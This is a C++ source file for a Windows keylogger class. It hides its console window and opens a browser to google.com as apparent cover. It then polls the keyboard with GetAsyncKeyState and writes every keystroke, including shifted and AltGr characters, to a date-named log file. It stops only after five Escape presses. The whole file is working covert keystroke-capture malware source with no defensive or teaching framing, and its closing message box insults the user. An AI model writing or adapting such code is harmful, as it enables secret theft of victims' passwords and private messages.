#include "Keylogger.h"
#include <Windows.h>
#include <thread>

Keylogger::Keylogger(const char * _fileName) : fileName(_fileName), escapeCounter(0)
{
	std::thread thread1(&Keylogger::hideConsole, this);
	std::thread thread2(&Keylogger::openInternetBrowser, this);

	thread1.join();
	thread2.join();

	if (isCreatedFile())
		saveKeys();
}

Keylogger::Keylogger() : escapeCounter(0)
{
	std::thread thread1(&Keylogger::hideConsole, this);
	std::thread thread2(&Keylogger::openInternetBrowser, this);
	getNameOfFileFromLocalDate();

	thread1.join();
	thread2.join();

	if (isCreatedFile())
		saveKeys();
}

Keylogger::~Keylogger()
{
	fclose(file);
	MessageBox(NULL, "Closing, little fucker", "Information", MB_ICONINFORMATION);
}

void Keylogger::hideConsole()
{
	HWND hook;
	hook = FindWindowA("ConsoleWindowClass", NULL);
	
	ShowWindow(hook, SW_HIDE);
}

void Keylogger::openInternetBrowser()
{
	ShellExecuteA(NULL, "open", "http://google.com", NULL, NULL, SW_SHOWNORMAL);
}

void Keylogger::getNameOfFileFromLocalDate()
{
	SYSTEMTIME time;
	GetLocalTime(&time);

	fileName = "log_" + std::to_string(time.wDay) + "." + std::to_string(time.wMonth) \
				+ "." + std::to_string(time.wYear) + "_" + std::to_string(time.wHour) \
				+ "." + std::to_string(time.wMinute) + ".txt";
}

bool Keylogger::isCreatedFile()
{
	fopen_s(&file, fileName.c_str(), "a+");

	if (file != NULL)
		return true;
	else
	{
		MessageBox(NULL, "Error - can't create file", "Information", MB_ICONINFORMATION);
		return false;
	}
}

void Keylogger::saveKeys()
{
	while (escapeCounter < 5)
		checkKey();
}

void Keylogger::checkKey()
{
	for (int i = 8; i <= 190; i++)
	{
		if (GetAsyncKeyState(i) == -32767)
		{
			saveKeyToFile(i);
			countIfEscape(i);
		}
	}
}

void Keylogger::saveKeyToFile(int pressedKey)
{
	switch (pressedKey)
	{
	case 9:
		fprintf(file, "%s", "[TAB]");
		break;
	//case 16:
	//	fprintf(file, "%s", "[SHIFT]");
	//	break;
	case 19:
		fprintf(file, "%s", "[PAUSE]");
		break;
	case 33:
		fprintf(file, "%s", "[PAGE_UP]");
		break;
	case 34:
		fprintf(file, "%s", "[PAGE_DOWN]");
		break;
	case 35:
		fprintf(file, "%s", "[END]");
		break;
	case 36:
		fprintf(file, "%s", "[HOME]");
		break;
	case 37:
		fprintf(file, "%s", "[LEFT]");
		break;
	case 38:
		fprintf(file, "%s", "[UP]");
		break;
	case 39:
		fprintf(file, "%s", "[RIGHT]");
		break;
	case 40:
		fprintf(file, "%s", "[DOWN]");
		break;
	case 44:
		fprintf(file, "%s", "[PRINT_SCREEN]");
		break;
	case 45:
		fprintf(file, "%s", "[INSERT]");
		break;
	case 91:
		fprintf(file, "%s", "[L_WIN]");
		break;
	case 92:
		fprintf(file, "%s", "[R_WIN]");
		break;
	case 112:
		fprintf(file, "%s", "[F1]");
		break;
	case 113:
		fprintf(file, "%s", "[F2]");
		break;
	case 114:
		fprintf(file, "%s", "[F3]");
		break;
	case 115:
		fprintf(file, "%s", "[F4]");
		break;
	case 116:
		fprintf(file, "%s", "[F5]");
		break;
	case 117:
		fprintf(file, "%s", "[F6]");
		break;
	case 118:
		fprintf(file, "%s", "[F7]");
		break;
	case 119:
		fprintf(file, "%s", "[F8]");
		break;
	case 120:
		fprintf(file, "%s", "[F9]");
		break;
	case 121:
		fprintf(file, "%s", "[F10]");
		break;
	case 122:
		fprintf(file, "%s", "[F11]");
		break;
	case 123:
		fprintf(file, "%s", "[F12]");
		break;
	case VK_RETURN:
		fprintf(file, "%s", "\n[RETURN]\n");
		break;
	case VK_BACK:
		fprintf(file, "%s", "[BACKSPACE]");
		break;
	case VK_ESCAPE:
		fprintf(file, "%s", "[ESC]");
		break;
	case VK_CAPITAL:
		fprintf(file, "%s", "[CAPSLOCK]");
		break;
	//case VK_LMENU:
	//	fprintf(file, "%s", "[LALT]");
	//	break;
	//case VK_RMENU:
	//	fprintf(file, "%s", "[RALT]");
	//	break;
	//case VK_MENU:
	//	fprintf(file, "%s", "[ALT]");
	//	break;
	//case VK_CONTROL:
	//	fprintf(file, "%s", "[CTRL]");
	//	break;
	case VK_DELETE:
		fprintf(file, "%s", "[DELETE]");
		break;
	case VK_SPACE:
		fprintf(file, "%s", " [SPACE] ");
		break;
	case VK_MULTIPLY:
		fprintf(file, "%s", "*");
		break;
	case VK_ADD:
		fprintf(file, "%s", "+");
		break;
	case VK_SUBTRACT:
		fprintf(file, "%s", "-");
		break;
	case VK_DECIMAL:
		fprintf(file, "%s", ",");
		break;
	case VK_DIVIDE:
		fprintf(file, "%s", "/");
		break;
	case 188:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "<");
		else
			fprintf(file, "%s", ",");
		break;
	case 192:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "~~");
		else
			fprintf(file, "%s", "`");
		break;
	case 222:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "\"");
		else
			fprintf(file, "%s", "'");
		break;
	case 220:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "|");
		else
			fprintf(file, "%s", "\\");
		break;
	case 219:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "{");
		else
			fprintf(file, "%s", "[");
		break;
	case 221:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "}");
		else
			fprintf(file, "%s", "]");
		break;
	case 186:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", ":");
		else
			fprintf(file, "%s", ";");
		break;
	case 191:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "?");
		else
			fprintf(file, "%s", "/");
		break;
	case 190:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", ">");
		else
			fprintf(file, "%s", ".");
		break;
	case 187:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "+");
		else
			fprintf(file, "%s", "=");
		break;
	case 189:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "_");
		else
			fprintf(file, "%s", "-");
		break;
	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if(GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "•");
			else
				fprintf(file, "%s", "A");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "π");
		else
			fprintf(file, "%s", "a");
		break;
	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "B");
		else
			fprintf(file, "%s", "b");
		break;
	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "∆");
			else
				fprintf(file, "%s", "C");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "Ê");
		else
			fprintf(file, "%s", "c");
		break;
	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "D");
		else
			fprintf(file, "%s", "d");
		break;
	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", " ");
			else
				fprintf(file, "%s", "E");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "Í");
		else
			fprintf(file, "%s", "e");
		break;
	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "F");
		else
			fprintf(file, "%s", "f");
		break;
	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "G");
		else
			fprintf(file, "%s", "g");
		break;
	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "H");
		else
			fprintf(file, "%s", "h");
		break;
	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "I");
		else
			fprintf(file, "%s", "i");
		break;
	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "J");
		else
			fprintf(file, "%s", "j");
		break;
	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "K");
		else
			fprintf(file, "%s", "k");
		break;
	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "£");
			else
				fprintf(file, "%s", "L");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "≥");
		else
			fprintf(file, "%s", "l");
		break;
	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "M");
		else
			fprintf(file, "%s", "m");
		break;
	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "—");
			else
				fprintf(file, "%s", "N");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "Ò");
		else
			fprintf(file, "%s", "n");
		break;
	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "”");
			else
				fprintf(file, "%s", "O");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "Û");
		else
			fprintf(file, "%s", "o");
		break;
	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "P");
		else
			fprintf(file, "%s", "p");
		break;
	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "Q");
		else
			fprintf(file, "%s", "q");
		break;
	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "R");
		else
			fprintf(file, "%s", "r");
		break;
	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "å");
			else
				fprintf(file, "%s", "S");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "ú");
		else
			fprintf(file, "%s", "s");
		break;
	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "T");
		else
			fprintf(file, "%s", "t");
		break;
	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "U");
		else
			fprintf(file, "%s", "u");
		break;
	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "V");
		else
			fprintf(file, "%s", "v");
		break;
	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "W");
		else
			fprintf(file, "%s", "w");
		break;
	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "è");
			else
				fprintf(file, "%s", "X");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "ü");
		else
			fprintf(file, "%s", "x");
		break;
	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "Y");
		else
			fprintf(file, "%s", "y");
		break;
	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
		{
			if (GetAsyncKeyState(VK_RMENU))
				fprintf(file, "%s", "Ø");
			else
				fprintf(file, "%s", "Z");
		}
		else if (GetAsyncKeyState(VK_RMENU))
			fprintf(file, "%s", "ø");
		else
			fprintf(file, "%s", "z");
		break;
	case VK_NUMPAD0:
		fprintf(file, "%s", "0");
		break;
	case VK_NUMPAD1:
		fprintf(file, "%s", "1");
		break;
	case VK_NUMPAD2:
		fprintf(file, "%s", "2");
		break;
	case VK_NUMPAD3:
		fprintf(file, "%s", "3");
		break;
	case VK_NUMPAD4:
		fprintf(file, "%s", "4");
		break;
	case VK_NUMPAD5:
		fprintf(file, "%s", "5");
		break;
	case VK_NUMPAD6:
		fprintf(file, "%s", "6");
		break;
	case VK_NUMPAD7:
		fprintf(file, "%s", "7");
		break;
	case VK_NUMPAD8:
		fprintf(file, "%s", "8");
		break;
	case VK_NUMPAD9:
		fprintf(file, "%s", "9");
		break;
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", ")");
		else
			fprintf(file, "%s", "0");
		break;
	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "!");
		else
			fprintf(file, "%s", "1");
		break;
	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "@");
		else
			fprintf(file, "%s", "2");
		break;
	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "#");
		else
			fprintf(file, "%s", "3");
		break;
	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "$");
		else
			fprintf(file, "%s", "4");
		break;
	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "%");
		else
			fprintf(file, "%s", "5");
		break;
	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "^");
		else
			fprintf(file, "%s", "6");
		break;
	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "&");
		else
			fprintf(file, "%s", "7");
		break;
	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "*");
		else
			fprintf(file, "%s", "8");
		break;
	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT))
			fprintf(file, "%s", "(");
		else
			fprintf(file, "%s", "9");
		break;
	}
}

void Keylogger::countIfEscape(int pressedKey)
{
	if (pressedKey == 27)
		escapeCounter++;
	else
		escapeCounter = 0;
}